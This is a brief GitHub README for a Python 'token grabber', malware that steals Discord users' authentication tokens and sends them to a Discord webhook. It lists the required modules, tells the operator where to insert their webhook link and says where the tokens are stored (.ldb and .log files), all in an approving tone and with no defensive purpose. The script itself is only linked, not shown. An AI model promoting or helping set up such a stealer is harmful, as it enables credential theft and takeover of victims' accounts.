# Python-token-grabber

Neat little grabber for Discord.

---
## Modules Needed
 1. dhooks 
 2. requests

It needs a Webhook Link on your discord server to work. Put the link in [('WEBHOOK HERE')](https://github.com/DeadBread76/python-token-grabber/blob/master/Token%20Grabber.py) 
And that's it. Token should be in one of the .ldb files or in the .log file.
